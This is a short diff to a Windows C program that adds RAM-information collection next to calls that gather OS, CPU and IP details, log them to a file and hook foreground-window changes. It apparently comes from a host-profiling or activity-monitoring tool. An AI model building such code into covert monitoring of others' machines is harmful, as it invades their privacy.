@@ -63,6 +63,7 @@ int WINAPI	WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	get_windows_info();
 	get_cpu_info();
 	get_ip_address();
+	get_ram_info();
 	write_to_file("--------------------------------\n");
 	HWINEVENTHOOK hook = SetWinEventHook(
 		EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND,
